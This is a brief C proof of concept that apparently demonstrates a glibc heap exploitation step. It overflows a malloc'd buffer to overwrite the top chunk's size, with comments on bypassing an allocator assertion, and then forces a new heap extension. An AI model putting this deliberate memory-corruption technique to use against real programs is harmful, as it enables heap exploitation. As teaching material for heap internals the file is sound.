#include <stdio.h>
#include <stdlib.h>


int main(void) {
    char *p = malloc(0x38);
    // Overwrite size of top so that it will bypass assertion
    // `((unsigned long) old_end & (pagesize - 1)) == 0))`
    // old_end == addr_top + size_top
    // old_end has to be aligned by page size
    *(unsigned long *)(p + 0x38) = (0x1000 - 0x40) | 1;
    malloc(0x1000);
}
